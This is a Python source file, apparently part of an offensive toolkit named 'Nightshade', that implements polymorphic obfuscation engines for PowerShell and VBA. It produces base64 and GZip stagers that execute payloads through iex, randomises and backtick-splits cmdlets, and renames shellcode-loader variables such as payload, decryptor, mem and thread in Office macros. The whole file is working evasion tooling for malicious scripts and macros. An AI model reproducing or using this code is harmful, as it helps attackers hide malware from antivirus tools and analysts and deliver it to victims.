"""
Nightshade Obfuscation — PowerShell and VBA obfuscation engines.
Produces significantly different output on each run (polymorphic).
"""
import random
import string
import base64
import zlib
from typing import List


class PSObfuscator:
    """Polymorphic PowerShell obfuscation engine."""

    def __init__(self):
        self._var_pool: List[str] = []
        self._func_pool: List[str] = []

    # ------------------------------------------------------------------ #
    #  Helpers                                                             #
    # ------------------------------------------------------------------ #
    @staticmethod
    def _rand_var() -> str:
        prefix = random.choice(["$", "$global:", "$script:", "$env:"])
        length = random.randint(6, 14)
        name = "_" + "".join(random.choices(string.ascii_lowercase, k=length))
        return prefix + name

    @staticmethod
    def _rand_func() -> str:
        return "F" + "".join(random.choices(string.ascii_letters, k=random.randint(8, 16)))

    @staticmethod
    def _random_case(s: str) -> str:
        """Randomise casing on cmdlet verbs."""
        tokens = s.split()
        result = []
        for t in tokens:
            if t.startswith("$") or t.startswith("'"):
                result.append(t)
                continue
            if any(c.isalpha() for c in t):
                t = "".join(
                    c.upper() if random.random() > 0.5 else c.lower() for c in t
                )
            result.append(t)
        return " ".join(result)

    @staticmethod
    def _tick_obfuscate(s: str) -> str:
        """Insert random backticks into cmdlet names."""
        tokens = s.split()
        result = []
        for t in tokens:
            if len(t) > 4 and not t.startswith("$") and not t.startswith("'"):
                pos = random.randint(1, len(t) - 2)
                t = t[:pos] + "`" + t[pos:]
            result.append(t)
        return " ".join(result)

    # ------------------------------------------------------------------ #
    #  String encoding                                                     #
    # ------------------------------------------------------------------ #
    @staticmethod
    def encode_string(s: str) -> str:
        """Encode string as -join @([char]X,[char]Y,...)."""
        chars = ",".join(f"[char]{ord(c)}" for c in s)
        return f"([string]::Join('',@({chars})))"

    @staticmethod
    def encode_string_invoke(s: str) -> str:
        """Encode as Invoke-Expression on a reversed/obfuscated base64 chunk."""
        encoded = base64.b64encode(s.encode("utf-16le")).decode()
        var = PSObfuscator._rand_var()
        return f"{var}=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{encoded}'));iex $({var})"

    @staticmethod
    def encode_string_reverse(s: str) -> str:
        """Reverse + -join split as obfuscation layer."""
        rev = s[::-1]
        var = PSObfuscator._rand_var()
        return f"{var}=-join'{rev}'[{len(rev)}..0];iex $({var})"

    @staticmethod
    def compress_payload(ps_code: str) -> str:
        """GZip + base64 compress a PowerShell script for the stager."""
        compressed = zlib.compress(ps_code.encode(), 9)[2:-4]  # strip zlib header
        b64 = base64.b64encode(compressed).decode()

        stager = f"""
$c=[System.Convert]::FromBase64String('{b64}')
$ms=New-Object System.IO.MemoryStream($c,0,$c.Length)
$ds=New-Object System.IO.Compression.GZipStream($ms,[System.IO.Compression.CompressionMode]::Decompress)
$sr=New-Object System.IO.StreamReader($ds)
iex($sr.ReadToEnd())
"""
        return stager.strip()

    # ------------------------------------------------------------------ #
    #  Full pipeline                                                       #
    # ------------------------------------------------------------------ #
    def obfuscate(self, ps_code: str, layers: int = 3) -> str:
        """Apply multiple obfuscation layers."""
        result = ps_code

        # Layer 1: random case on cmdlets
        if layers >= 1:
            result = self._random_case(result)

        # Layer 2: backtick insertion
        if layers >= 2:
            result = self._tick_obfuscate(result)

        # Layer 3: variable substitution for literal strings
        if layers >= 3:
            lines = result.split("\n")
            new_lines = []
            for line in lines:
                if "'" in line and len(line) < 200:
                    # Replace short quoted strings with char-join encoding
                    import re

                    def _replace_match(m):
                        s = m.group(1)
                        if len(s) < 4 or len(s) > 40:
                            return m.group(0)
                        return self.encode_string(s)

                    line = re.sub(r"'([^']+)'", _replace_match, line)
                new_lines.append(line)
            result = "\n".join(new_lines)

        # Layer 4: comment insertion
        if layers >= 4:
            junk_comment = f"# {''.join(random.choices(string.printable[:62], k=random.randint(20, 60)))}"
            lines = result.split("\n")
            if lines:
                insert_at = random.randint(0, len(lines) - 1)
                lines.insert(insert_at, junk_comment)
            result = "\n".join(lines)

        return result


class VBAObfuscator:
    """Polymorphic VBA obfuscation for embedded macros."""

    @staticmethod
    def random_var() -> str:
        prefixes = ["v", "x", "_", "p", "s"]
        return (
            random.choice(prefixes)
            + "".join(random.choices(string.ascii_uppercase, k=random.randint(4, 10)))
            + str(random.randint(10, 99))
        )

    @staticmethod
    def obfuscate_vba(vba_code: str) -> str:
        """Insert dead code, rename variables, split strings."""
        var_map = {}
        lines = vba_code.split("\n")
        new_lines = []
        func_count = 0

        for line in lines:
            # Rename variables
            for old_var in ["payload", "key", "decodedData", "plainText", "cipherText",
                            "mem", "thread", "aesObj", "decryptor", "encryptedData"]:
                if old_var in line and "Dim" not in line:
                    if old_var not in var_map:
                        var_map[old_var] = VBAObfuscator.random_var()
                    line = line.replace(old_var, var_map[old_var])

            new_lines.append(line)

            # Insert dead code after certain lines
            if "Function" in line or "Sub" in line:
                # Rename function/sub
                if "Nightshade" in line:
                    func_count += 1
                    new_name = VBAObfuscator.random_var()
                    line = line.replace("NightshadeInitialize", new_name)

            # Short junk comment on some lines
            if random.random() < 0.15 and len(line) > 10:
                junk = "'" + "".join(random.choices(string.ascii_letters, k=random.randint(8, 20)))
                new_lines.append(junk)

        return "\n".join(new_lines)

    @staticmethod
    def obfuscated_vba_wrapper(vba_code: str) -> str:
        """Wrap VBA in obfuscation layers."""
        obs = VBAObfuscator.obfuscate_vba(vba_code)
        # Add junk module-level declarations
        junk_funcs = [
            f"Private Function {VBAObfuscator.random_var()}() As Long\n    {VBAObfuscator.random_var()} = 0\nEnd Function\n"
        ]
        return "\n".join(junk_funcs) + "\n" + obs
